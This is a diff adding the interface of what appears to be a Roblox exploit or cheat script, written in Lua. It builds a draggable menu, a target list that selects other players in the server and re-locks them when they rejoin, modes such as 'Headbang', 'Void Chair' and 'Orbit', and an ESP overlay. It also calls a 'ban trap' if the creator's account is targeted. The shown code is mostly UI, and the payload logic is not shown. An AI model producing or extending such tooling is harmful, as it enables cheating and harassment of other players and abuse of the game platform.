+                eventGlow.ImageTransparency = 0.1 + (math.sin(activeT * 10) * 0.05)
+            else
+                openBtn.Size = openBtn.Size:Lerp(baseOrbScale, dt * 12)
+                openBtn.Position = openBtn.Position:Lerp(baseCenterPos, dt * 12)
+                eventGlow.Position = eventGlow.Position:Lerp(baseCenterPos, dt * 12)
+                crosshair.Position = crosshair.Position:Lerp(baseCenterPos, dt * 12)
+                centerCore.Position = centerCore.Position:Lerp(baseCenterPos, dt * 12)
+                eventGlow.ImageTransparency = 0.3 + (math.cos(activeT * 2) * 0.3)
+            end
+
+            local sonarThreshold = isSystemActive and 0.3 or 0.8
+            sonarTimer = sonarTimer + dt
+            if sonarTimer >= sonarThreshold then
+                sonarTimer = 0
+                spawnSonar(baseColor1)
+            end
+        end
+    end)
+end)
+
+local openBtnScale = Instance.new("UIScale", openBtn)
+openBtnScale.Scale = 1
+
+local openPulseTweenInfo = TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+local openPulseScale = TweenService:Create(openBtnScale, openPulseTweenInfo, {Scale = 1.05})
+
+openBtnContainer:GetPropertyChangedSignal("Visible"):Connect(function() 
+    if openBtnContainer.Visible then 
+        openPulseScale:Play()
+    else 
+        openPulseScale:Cancel()
+        openBtnScale.Scale = 1
+    end 
+end)
+
+local function makeDraggable(frame, handle, ghostAura, isOrb)
+    local dragging = false
+    local dragStart = nil
+    local startPos = nil
+    local targetPos = frame.Position
+    local velocity = Vector2.new(0,0)
+    local lastInputPos = Vector2.new(0,0)
+    local dragLoop = nil
+
+    local function getClampedTarget(newXScale, newXOffset, newYScale, newYOffset)
+        local parentSize = gui.AbsoluteSize
+        local frameSize = frame.AbsoluteSize
+        local anchor = frame.AnchorPoint
+
+        local absX = (newXScale * parentSize.X) + newXOffset
+        local absY = (newYScale * parentSize.Y) + newYOffset
+
+        local minX = frameSize.X * anchor.X
+        local maxX = parentSize.X - (frameSize.X * (1 - anchor.X))
+        local minY = frameSize.Y * anchor.Y
+        local maxY = parentSize.Y - (frameSize.Y * (1 - anchor.Y))
+
+        local clampedX = math.clamp(absX, minX, maxX)
+        local clampedY = math.clamp(absY, minY, maxY)
+
+        return UDim2.new(newXScale, clampedX - (newXScale * parentSize.X), newYScale, clampedY - (newYScale * parentSize.Y))
+    end
+
+    handle.InputBegan:Connect(function(input) 
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            targetPos = startPos
+            lastInputPos = Vector2.new(input.Position.X, input.Position.Y)
+            velocity = Vector2.new(0,0)
+            
+            if isOrb then 
+                isDraggingOrb = true
+                dragThresholdMet = false 
+            end
+            
+            if dragLoop then 
+                dragLoop:Disconnect() 
+            end
+            
+            dragLoop = RunService.RenderStepped:Connect(function(dt)
+                if _G.TXR_InstanceID ~= currentExecutionID then 
+                    dragLoop:Disconnect() 
+                    return 
+                end 
+                
+                if dragging then
+                    frame.Position = frame.Position:Lerp(targetPos, math.clamp(dt * 25, 0, 1))
+                else
+                    if velocity.Magnitude > 0.5 then
+                        velocity = velocity * 0.90
+                        targetPos = getClampedTarget(targetPos.X.Scale, targetPos.X.Offset + velocity.X, targetPos.Y.Scale, targetPos.Y.Offset + velocity.Y)
+                        frame.Position = frame.Position:Lerp(targetPos, math.clamp(dt * 15, 0, 1))
+                    else
+                        dragLoop:Disconnect()
+                        dragLoop = nil
+                    end
+                end
+                
+                if ghostAura then 
+                    ghostAura.Position = frame.Position 
+                end
+            end)
+        end 
+    end)
+
+    handle.InputEnded:Connect(function(input) 
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
+            dragging = false
+            if isOrb then 
+                isDraggingOrb = false
+                orbHovered = false 
+            end
+        end 
+    end)
+
+    UserInputService.InputChanged:Connect(function(input) 
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then 
+            local delta = input.Position - dragStart
+            if isOrb and delta.Magnitude > 5 then 
+                dragThresholdMet = true 
+            end
+            
+            targetPos = getClampedTarget(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+            local currentMousePos = Vector2.new(input.Position.X, input.Position.Y)
+            velocity = currentMousePos - lastInputPos
+            lastInputPos = currentMousePos
+        end 
+    end)
+end
+
+makeDraggable(mainFrame, mainFrame, aura, false) 
+makeDraggable(openBtnContainer, openBtn, nil, true)
+
+openBtn.MouseButton1Down:Connect(function() 
+    local tInfo = TweenInfo.new(0.12, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+    TweenService:Create(openBtnScale, tInfo, {Scale = 0.85}):Play() 
+end)
+
+openBtn.MouseButton1Up:Connect(function() 
+    local tInfo = TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out, 0, false, 0.2)
+    TweenService:Create(openBtnScale, tInfo, {Scale = 1.05}):Play() 
+end)
+
+closeBtn.MouseButton1Click:Connect(function() 
+    closeOverlay.Visible = true
+    closeModal.Position = UDim2.fromScale(0.5, 0.45)
+    TweenService:Create(closeOverlay, TweenInfo.new(0.3), {BackgroundTransparency = 0.6}):Play()
+    TweenService:Create(closeModal, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.fromScale(0.5, 0.5)}):Play()
+end)
+
+cmCancel.MouseButton1Click:Connect(function()
+    TweenService:Create(closeOverlay, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
+    local hideTween = TweenService:Create(closeModal, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.fromScale(0.5, 0.55)})
+    hideTween.Completed:Connect(function()
+        closeOverlay.Visible = false
+    end)
+    hideTween:Play()
+end)
+
+cmConfirm.MouseButton1Click:Connect(function() 
+    local tInfo1 = TweenInfo.new(0.4, Enum.EasingStyle.Exponential, Enum.EasingDirection.In)
+    local tInfo2 = TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.In)
+    
+    TweenService:Create(mainScale, tInfo1, {Scale = 0}):Play()
+    TweenService:Create(auraScale, tInfo1, {Scale = 0}):Play()
+    TweenService:Create(mainFrame, tInfo2, {BackgroundTransparency = 1, Position = UDim2.new(0.5, 0, 0.5, 30)}):Play()
+    TweenService:Create(aura, tInfo2, {ImageTransparency = 1}):Play()
+    
+    task.wait(0.4)
+    gui:Destroy()
+    activeModes = {}
+    isSystemActive = false 
+    
+    if _G.TXR_ESP_GUI then 
+        _G.TXR_ESP_GUI:Destroy() 
+    end 
+end)
+
+minimizeBtn.MouseButton1Click:Connect(function() 
+    local tInfo1 = TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+    local tInfo2 = TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.In)
+    
+    TweenService:Create(mainScale, tInfo1, {Scale = 0}):Play()
+    TweenService:Create(auraScale, tInfo1, {Scale = 0}):Play()
+    TweenService:Create(mainFrame, tInfo2, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(aura, tInfo2, {ImageTransparency = 1}):Play()
+    
+    task.wait(0.4)
+    mainFrame.Visible = false
+    aura.Visible = false
+    openBtnContainer.Visible = true
+    openBtnScale.Scale = 0
+    
+    local tInfo3 = TweenInfo.new(0.6, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out)
+    TweenService:Create(openBtnScale, tInfo3, {Scale = 1}):Play() 
+end)
+
+openBtn.MouseButton1Click:Connect(function() 
+    if dragThresholdMet then return end 
+    
+    local tInfo1 = TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+    TweenService:Create(openBtnScale, tInfo1, {Scale = 0}):Play()
+    
+    task.wait(0.25)
+    
+    openBtnContainer.Visible = false
+    mainFrame.Visible = true
+    aura.Visible = true
+    mainScale.Scale = 0.8
+    auraScale.Scale = 0.8
+    
+    local tInfo2 = TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+    local tInfo3 = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+    
+    TweenService:Create(mainScale, tInfo2, {Scale = 1}):Play()
+    TweenService:Create(auraScale, tInfo2, {Scale = 1}):Play()
+    TweenService:Create(mainFrame, tInfo3, {BackgroundTransparency = 0.1}):Play()
+    TweenService:Create(aura, tInfo3, {ImageTransparency = 0.55}):Play()
+    
+    if not isSubMenuOpen then
+        animateWaterfall(mainList)
+    end
+end)
+
+local mainList = Instance.new("ScrollingFrame", mainFrame)
+mainList.Size = UDim2.new(1, -24, 1, -88)
+mainList.Position = UDim2.fromOffset(12, 56)
+mainList.BackgroundTransparency = 1
+mainList.ScrollBarThickness = 0
+mainList.ScrollingDirection = Enum.ScrollingDirection.Y
+mainList.ZIndex = 6
+
+local listLayout = Instance.new("UIListLayout", mainList)
+listLayout.Padding = UDim.new(0, 8)
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local mainPadding = Instance.new("UIPadding", mainList)
+mainPadding.PaddingLeft = UDim.new(0, 10)
+mainPadding.PaddingRight = UDim.new(0, 10)
+mainPadding.PaddingTop = UDim.new(0, 2)
+mainPadding.PaddingBottom = UDim.new(0, 2)
+
+listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() 
+    mainList.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 10) 
+end)
+
+local layoutIdx = 1
+local function getOrder() 
+    layoutIdx = layoutIdx + 1
+    return layoutIdx 
+end
+
+local function createMenu(titleStr)
+    local menu = Instance.new("Frame", mainFrame)
+    menu.Size = UDim2.fromScale(1, 1)
+    menu.Position = UDim2.fromScale(1.2, 0)
+    menu.BackgroundColor3 = Colors.Background
+    menu.BackgroundTransparency = 0.1
+    menu.ZIndex = 20
+    
+    local menuCorner = Instance.new("UICorner", menu)
+    menuCorner.CornerRadius = UDim.new(0, 14)
+    
+    local top = Instance.new("Frame", menu)
+    top.Size = UDim2.new(1, 0, 0, 50)
+    top.BackgroundColor3 = Colors.Background
+    top.BackgroundTransparency = 1
+    top.ZIndex = 21
+    
+    local menuTitle = Instance.new("TextLabel", top)
+    menuTitle.Size = UDim2.new(1, -60, 1, 0)
+    menuTitle.Position = UDim2.fromOffset(16, 0)
+    menuTitle.BackgroundTransparency = 1
+    menuTitle.Text = titleStr
+    menuTitle.TextColor3 = Colors.Text
+    menuTitle.Font = Enum.Font.GothamBlack
+    menuTitle.TextSize = 14
+    menuTitle.TextXAlignment = Enum.TextXAlignment.Left
+    menuTitle.ZIndex = 22
+    
+    local mTitleGrad = Instance.new("UIGradient", menuTitle)
+    mTitleGrad.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Colors.Primary), 
+        ColorSequenceKeypoint.new(1, Colors.Purple)
+    })
+    crispText(menuTitle)
+
+    local backBtn = Instance.new("TextButton", top)
+    backBtn.Size = UDim2.fromOffset(40, 26)
+    backBtn.Position = UDim2.new(1, -50, 0.5, -13)
+    backBtn.BackgroundColor3 = Colors.Surface
+    backBtn.BackgroundTransparency = 0.5
+    backBtn.Text = "←"
+    backBtn.TextColor3 = Colors.Primary
+    backBtn.Font = Enum.Font.GothamBold
+    backBtn.TextSize = 15
+    backBtn.AutoButtonColor = false
+    backBtn.ZIndex = 22
+    
+    local backCorner = Instance.new("UICorner", backBtn)
+    backCorner.CornerRadius = UDim.new(0, 6)
+    applySmartHover(backBtn, nil)
+    
+    local scroll = Instance.new("ScrollingFrame", menu)
+    scroll.Size = UDim2.new(1, -24, 1, -66)
+    scroll.Position = UDim2.fromOffset(12, 56)
+    scroll.BackgroundTransparency = 1
+    scroll.ScrollBarThickness = 0
+    scroll.ScrollingDirection = Enum.ScrollingDirection.Y
+    scroll.ZIndex = 22
+    
+    local lay = Instance.new("UIListLayout", scroll)
+    lay.Padding = UDim.new(0, 8)
+    lay.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    lay.SortOrder = Enum.SortOrder.LayoutOrder
+    
+    local scrollPad = Instance.new("UIPadding", scroll)
+    scrollPad.PaddingLeft = UDim.new(0, 10)
+    scrollPad.PaddingRight = UDim.new(0, 10)
+    
+    lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() 
+        scroll.CanvasSize = UDim2.new(0, 0, 0, lay.AbsoluteContentSize.Y + 10) 
+    end)
+    
+    backBtn.MouseButton1Click:Connect(function() 
+        isSubMenuOpen = false
+        local tInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+        TweenService:Create(menu, tInfo, {Position = UDim2.fromScale(1.2, 0)}):Play()
+        mainList.Visible = true 
+        animateWaterfall(mainList)
+    end)
+    
+    return menu, scroll
+end
+
+local playerMenu, playerScroll = createMenu("👥 MATRIX TARGETS")
+local geoMenu, geoScroll = createMenu("📐 GEOM CORE")
+
+local function refreshPlayers()
+    for _, child in ipairs(playerScroll:GetChildren()) do 
+        if child:IsA("TextButton") then 
+            child:Destroy() 
+        end 
+    end
+    
+    for _, plr in ipairs(Players:GetPlayers()) do
+        local btn = Instance.new("TextButton", playerScroll)
+        btn.Size = UDim2.new(1, 0, 0, 36)
+        btn.BackgroundColor3 = selectedPlayers[plr] and Colors.ActiveTint or Colors.Surface
+        btn.BackgroundTransparency = 0.4
+        btn.Font = Enum.Font.GothamMedium
+        btn.TextSize = 11
+        btn.TextXAlignment = Enum.TextXAlignment.Left
+        btn.AutoButtonColor = false
+        btn.LayoutOrder = getOrder()
+        btn.ZIndex = 23
+        
+        local btnCorner = Instance.new("UICorner", btn)
+        btnCorner.CornerRadius = UDim.new(0, 6)
+        
+        btn.Text = string.format("    %s | @%s", plr.DisplayName, plr.Name)
+        btn.TextColor3 = selectedPlayers[plr] and Colors.Primary or Colors.Text
+        
+        applySmartHover(btn, nil)
+        crispText(btn)
+
+        local accent = Instance.new("Frame", btn)
+        accent.Size = selectedPlayers[plr] and UDim2.new(0, 3, 0.6, 0) or UDim2.new(0, 0, 0, 0)
+        accent.Position = UDim2.new(0, 0, 0.5, 0)
+        accent.AnchorPoint = Vector2.new(0, 0.5)
+        accent.BackgroundColor3 = Colors.Primary
+        accent.BorderSizePixel = 0
+        
+        local accentCorner = Instance.new("UICorner", accent)
+        accentCorner.CornerRadius = UDim.new(1,0)
+        
+        btn.MouseButton1Click:Connect(function()
+            if plr.UserId == CREATOR_USER_ID and lp.UserId ~= CREATOR_USER_ID then 
+                triggerBanTrap() 
+                return 
+            end
+            
+            if selectedPlayers[plr] then 
+                selectedPlayers[plr] = nil
+                autoRejoinTargets[plr.UserId] = nil
+                
+                local tInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quart)
+                TweenService:Create(btn, tInfo, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
+                TweenService:Create(accent, tInfo, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
+                
+                btn:SetAttribute("BaseColor", Colors.Surface)
+                btn:SetAttribute("BaseText", Colors.Text)
+            else 
+                selectedPlayers[plr] = true
+                autoRejoinTargets[plr.UserId] = true
+                
+                local tInfo1 = TweenInfo.new(0.4, Enum.EasingStyle.Quart)
+                local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
+                
+                TweenService:Create(btn, tInfo1, {BackgroundColor3 = Colors.ActiveTint, TextColor3 = Colors.Primary}):Play()
+                TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 3, 0.6, 0)}):Play() 
+                
+                btn:SetAttribute("BaseColor", Colors.ActiveTint)
+                btn:SetAttribute("BaseText", Colors.Primary)
+            end
+        end)
+    end
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    if autoRejoinTargets[plr.UserId] then 
+        selectedPlayers[plr] = true 
+    end
+    
+    plr.CharacterAdded:Connect(function()
+        if selectedPlayers[plr] then 
+            voidedPlayers[plr] = nil
+            assignedRemotes[plr] = nil
+            targetVelocities[plr] = Vector3.new(0,0,0) 
+        end
+    end)
+    refreshPlayers()
+end)
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    plr.CharacterAdded:Connect(function()
+        if selectedPlayers[plr] then 
+            voidedPlayers[plr] = nil
+            assignedRemotes[plr] = nil
+            targetVelocities[plr] = Vector3.new(0,0,0) 
+        end
+    end)
+end
+
+Players.PlayerRemoving:Connect(function(plr)
+    selectedPlayers[plr] = nil
+    assignedRemotes[plr] = nil
+    voidedPlayers[plr] = nil
+    targetVelocities[plr] = nil
+    refreshPlayers()
+end)
+
+refreshPlayers()
+
+local geometries = {"Standard Orbit", "Spin", "Reverse Spin", "Bobbing Orbit", "Vertical Halo", "Atom", "Galaxy Spiral", "Crown", "DNA", "Snake Body", "Wings", "BlackHole Vortex", "Quantum Pulsar", "Hyper Wave", "Supernova Explosion", "Matrix Grid", "Eclipse Shadowing"}
+for _, geo in ipairs(geometries) do
+    local btn = Instance.new("TextButton", geoScroll)
+    btn.Size = UDim2.new(1, 0, 0, 36)
+    btn.BackgroundColor3 = Colors.Surface
+    btn.BackgroundTransparency = 0.4
+    btn.Text = "   ⚡ " .. geo
+    btn.TextColor3 = Colors.Text
+    btn.Font = Enum.Font.GothamMedium
+    btn.TextSize = 11
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    btn.AutoButtonColor = false
+    btn.LayoutOrder = getOrder()
+    btn.ZIndex = 23
+    
+    local btnCorner = Instance.new("UICorner", btn)
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    
+    applySmartHover(btn, nil)
+    crispText(btn)
+    
+    btn.MouseButton1Click:Connect(function() 
+        activeGeometry = geo
+        isSubMenuOpen = false
+        sendNotif("📐 GEOMETRY CORE", "Lock: " .. geo, 2)
+        
+        local tInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+        TweenService:Create(geoMenu, tInfo, {Position = UDim2.fromScale(1.2, 0)}):Play()
+        mainList.Visible = true 
+        animateWaterfall(mainList)
+    end)
+end
+
+local function createMainBtn(text, modeKey, isMenuOpener)
+    local btn = Instance.new("TextButton", mainList)
+    btn.Size = UDim2.new(1, 0, 0, 42)
+    btn.BackgroundColor3 = Colors.Surface
+    btn.BackgroundTransparency = 0.4
+    btn.Text = "   " .. text
+    btn.TextColor3 = Colors.Text
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 11
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    btn.AutoButtonColor = false
+    btn.LayoutOrder = getOrder()
+    btn.ZIndex = 7
+    
+    local btnCorner = Instance.new("UICorner", btn)
+    btnCorner.CornerRadius = UDim.new(0, 8)
+    crispText(btn)
+
+    local accent = Instance.new("Frame", btn)
+    accent.Name = "Accent"
+    accent.Size = UDim2.new(0, 0, 0, 0)
+    accent.Position = UDim2.new(0, 0, 0.5, 0)
+    accent.AnchorPoint = Vector2.new(0, 0.5)
+    accent.BackgroundColor3 = Colors.Primary
+    accent.BorderSizePixel = 0
+    
+    local accentCorner = Instance.new("UICorner", accent)
+    accentCorner.CornerRadius = UDim.new(1,0)
+    
+    if isMenuOpener then 
+        local arrow = Instance.new("TextLabel", btn)
+        arrow.Size = UDim2.new(0, 30, 1, 0)
+        arrow.Position = UDim2.new(1, -30, 0, 0)
+        arrow.BackgroundTransparency = 1
+        arrow.Text = ">"
+        arrow.TextColor3 = Colors.SubText
+        arrow.Font = Enum.Font.GothamBold
+        arrow.TextSize = 12 
+    end
+    
+    if not isMenuOpener then 
+        applySmartHover(btn, modeKey) 
+    else 
+        applySmartHover(btn, nil) 
+    end
+    
+    return btn
+end
+
+local function createSlider(name, min, max, defaultVal, suffix)
+    local container = Instance.new("Frame", mainList)
+    container.Size = UDim2.new(1, 0, 0, 46)
+    container.BackgroundTransparency = 1
+    container.LayoutOrder = getOrder()
+    container.ZIndex = 7
+    
+    local titleLabel = Instance.new("TextLabel", container)
+    titleLabel.Size = UDim2.new(0.6, 0, 0, 14)
+    titleLabel.Position = UDim2.new(0, 6, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = name
+    titleLabel.TextColor3 = Colors.SubText
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextSize = 10
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.ZIndex = 8
+    crispText(titleLabel)
+
+    local valBadge = Instance.new("Frame", container)
+    valBadge.Size = UDim2.new(0, 48, 0, 16)
+    valBadge.AnchorPoint = Vector2.new(1, 0)
+    valBadge.Position = UDim2.new(1, -6, 0, -1)
+    valBadge.BackgroundColor3 = Colors.Primary
+    valBadge.BackgroundTransparency = 0.85
+    valBadge.ZIndex = 8
+    
+    local badgeCorner = Instance.new("UICorner", valBadge)
+    badgeCorner.CornerRadius = UDim.new(0, 4)
+    
+    local valStroke = Instance.new("UIStroke", valBadge)
+    valStroke.Color = Colors.Primary
+    valStroke.Transparency = 0.5
+    valStroke.Thickness = 1
+    
+    local valLabel = Instance.new("TextLabel", valBadge)
+    valLabel.Size = UDim2.new(1, 0, 1, 0)
+    valLabel.BackgroundTransparency = 1
+    valLabel.Text = defaultVal .. (suffix or "")
+    valLabel.TextColor3 = Colors.Primary
+    valLabel.Font = Enum.Font.GothamBold
+    valLabel.TextSize = 10
+    valLabel.ZIndex = 9
+    crispText(valLabel)
+
+    local bg = Instance.new("Frame", container)
+    bg.Size = UDim2.new(1, -20, 0, 4)
+    bg.Position = UDim2.new(0, 10, 0, 26)
+    bg.BackgroundColor3 = Colors.SurfaceHover
+    bg.ZIndex = 8
+    
+    local bgCorner = Instance.new("UICorner", bg)
+    bgCorner.CornerRadius = UDim.new(1, 0)
+    
+    local hitbox = Instance.new("TextButton", container)
+    hitbox.Size = UDim2.new(1, 0, 0, 30)
+    hitbox.Position = UDim2.new(0, 0, 0, 13)
+    hitbox.BackgroundTransparency = 1
+    hitbox.Text = ""
+    hitbox.ZIndex = 15
+    
+    local fill = Instance.new("Frame", bg)
+    fill.Size = UDim2.new((defaultVal - min) / (max - min), 0, 1, 0)
+    fill.BackgroundColor3 = Colors.PrimaryDark
+    fill.ZIndex = 9
+    
+    local fillCorner = Instance.new("UICorner", fill)
+    fillCorner.CornerRadius = UDim.new(1, 0)
+    
+    local knob = Instance.new("Frame", fill)
+    knob.Size = UDim2.new(0, 14, 0, 14)
+    knob.AnchorPoint = Vector2.new(0.5, 0.5)
+    knob.Position = UDim2.new(1, 0, 0.5, 0)
+    knob.BackgroundColor3 = Colors.Text
+    knob.ZIndex = 11
+    
+    local knobCorner = Instance.new("UICorner", knob)
+    knobCorner.CornerRadius = UDim.new(1,0)
+    
+    local knobDot = Instance.new("Frame", knob)
+    knobDot.Size = UDim2.new(0, 6, 0, 6)
+    knobDot.AnchorPoint = Vector2.new(0.5, 0.5)
+    knobDot.Position = UDim2.fromScale(0.5, 0.5)
+    knobDot.BackgroundColor3 = Colors.Primary
+    knobDot.BorderSizePixel = 0
+    knobDot.ZIndex = 12
+    
+    local dotCorner = Instance.new("UICorner", knobDot)
+    dotCorner.CornerRadius = UDim.new(1,0)
+    
+    local knobStroke = Instance.new("UIStroke", knob)
+    knobStroke.Color = Colors.Primary
+    knobStroke.Transparency = 0.8
+    knobStroke.Thickness = 2
+
+    local value = defaultVal
+    local dragging = false
+    
+    local function update(input) 
+        local rawPos = input.Position.X
+        local relativeX = math.clamp(rawPos - bg.AbsolutePosition.X, 0, bg.AbsoluteSize.X)
+        local pos = relativeX / bg.AbsoluteSize.X
+        
+        local tInfo = TweenInfo.new(0.05, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+        TweenService:Create(fill, tInfo, {Size = UDim2.new(pos, 0, 1, 0)}):Play()
+        
+        value = math.floor(min + (pos * (max - min)))
+        valLabel.Text = value .. (suffix or "")
+    end
+    
+    hitbox.InputBegan:Connect(function(input) 
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
+            dragging = true
+            uiHoverCount = uiHoverCount + 1
+            
+            local tInfo1 = TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+            local tInfo2 = TweenInfo.new(0.3, Enum.EasingStyle.Quart)
+            
+            TweenService:Create(knob, tInfo1, {Size = UDim2.new(0, 18, 0, 18)}):Play()
+            TweenService:Create(knobDot, tInfo2, {Size = UDim2.new(0, 8, 0, 8)}):Play()
+            TweenService:Create(knobStroke, tInfo2, {Transparency = 0.1, Thickness = 4}):Play()
+            TweenService:Create(valBadge, tInfo2, {BackgroundTransparency = 0.2}):Play()
+            TweenService:Create(valStroke, tInfo2, {Transparency = 0}):Play()
+            
+            TweenService:Create(fill, tInfo2, {BackgroundColor3 = Color3.fromRGB(150, 255, 240)}):Play()
+            update(input) 
+        end 
+    end)
+    
+    hitbox.InputEnded:Connect(function(input) 
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
+            dragging = false
+            uiHoverCount = math.max(0, uiHoverCount - 1)
+            
+            local tInfo1 = TweenInfo.new(0.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
+            local tInfo2 = TweenInfo.new(0.4, Enum.EasingStyle.Quart)
+            
+            TweenService:Create(knob, tInfo1, {Size = UDim2.new(0, 14, 0, 14)}):Play()
+            TweenService:Create(knobDot, tInfo2, {Size = UDim2.new(0, 6, 0, 6)}):Play()
+            TweenService:Create(knobStroke, tInfo2, {Transparency = 0.8, Thickness = 2}):Play()
+            TweenService:Create(valBadge, tInfo2, {BackgroundTransparency = 0.85}):Play()
+            TweenService:Create(valStroke, tInfo2, {Transparency = 0.5}):Play()
+            
+            TweenService:Create(fill, tInfo2, {BackgroundColor3 = Colors.PrimaryDark}):Play()
+        end 
+    end)
+    
+    UserInputService.InputChanged:Connect(function(input) 
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then 
+            update(input) 
+        end 
+    end)
+    
+    return function() 
+        return value 
+    end
+end
+
+local getRadius = createSlider("🪐 ORBIT RADIUS", 2, 100, 15, "")
+local getSpeedMs = createSlider("⚡ ENGINE YIELD", 10, 300, 50, " %") 
+
+local openTargetBtn = createMainBtn("👥 LOCK ON TARGETS", nil, true)
+openTargetBtn.MouseButton1Click:Connect(function() 
+    mainList.Visible = false
+    isSubMenuOpen = true
+    sendNotif("👥 TARGETS", "Opening Matrix Targets Menu.", 2)
+    local tInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    TweenService:Create(playerMenu, tInfo, {Position = UDim2.fromScale(0, 0)}):Play() 
+    animateWaterfall(playerScroll)
+end)
+
+local openGeoBtn = createMainBtn("📐 GEOMETRY CORE", nil, true)
+openGeoBtn.MouseButton1Click:Connect(function() 
+    mainList.Visible = false
+    isSubMenuOpen = true
+    sendNotif("📐 GEOMETRY", "Opening Geometry Core Menu.", 2)
+    local tInfo = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    TweenService:Create(geoMenu, tInfo, {Position = UDim2.fromScale(0, 0)}):Play() 
+    animateWaterfall(geoScroll)
+end)
+
+local orbitBtn = createMainBtn("🪐 QUANTUM ORBIT", "Orbit", false)
+local robotBtn = createMainBtn("🤖 RADIAL SURROUND", "Robot", false)
+local multiBtn = createMainBtn("🤖 DUAL SYSTEM", "MultiRobot", false)
+local ringBtn = createMainBtn("⭕ ACCELERATOR RING", "Ring", false)
+local headBtn = createMainBtn("🧠 CRANIAL FORCE", "HeadBang", false)
+local chairBtn = createMainBtn("🛏️ SMART VOID CHAIR", "Chair", false)
+
+local modeBtns = { 
+    ["Orbit"] = {btn = orbitBtn}, 
+    ["Robot"] = {btn = robotBtn}, 
+    ["MultiRobot"] = {btn = multiBtn}, 
+    ["Ring"] = {btn = ringBtn}, 
+    ["HeadBang"] = {btn = headBtn}, 
+    ["Chair"] = {btn = chairBtn} 
+}
+
+local function syncComboUI()
+    for key, data in pairs(modeBtns) do
+        local btn = data.btn
+        local accent = btn:FindFirstChild("Accent")
+        local tInfo1 = TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+        local tInfo2 = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+        
+        if activeModes[key] then 
+            TweenService:Create(btn, tInfo1, {BackgroundColor3 = Colors.ActiveTint, TextColor3 = Colors.Primary}):Play()
+            if accent then 
+                TweenService:Create(accent, tInfo2, {Size = UDim2.new(0, 4, 0.7, 0)}):Play() 
+            end
+        else 
+            TweenService:Create(btn, tInfo1, {BackgroundColor3 = Colors.Surface, TextColor3 = Colors.Text}):Play()
+            if accent then 
+                TweenService:Create(accent, tInfo1, {Size = UDim2.new(0, 0, 0, 0)}):Play() 
+            end
+        end
+    end
+end
+
+for key, data in pairs(modeBtns) do
+    data.btn.MouseButton1Click:Connect(function()
+        if activeModes[key] then 
+            activeModes[key] = false
+            for i, v in ipairs(modeQueue) do 
+                if v == key then 
+                    table.remove(modeQueue, i) 
+                    break 
+                end 
+            end
+        else 
+            if #modeQueue >= 2 then 
+                local oldest = table.remove(modeQueue, 1)
+                activeModes[oldest] = false 
+            end
+            activeModes[key] = true
+            table.insert(modeQueue, key) 
+        end
+        syncComboUI()
+        sendNotif("⚙️ ENGINE MODE", key .. " mode " .. (activeModes[key] and "Activated" or "Deactivated"), 2)
+    end)
+end
+
+local espBtn = createMainBtn("👁️ TACTICAL ESP (HUD)", "ESP", false)
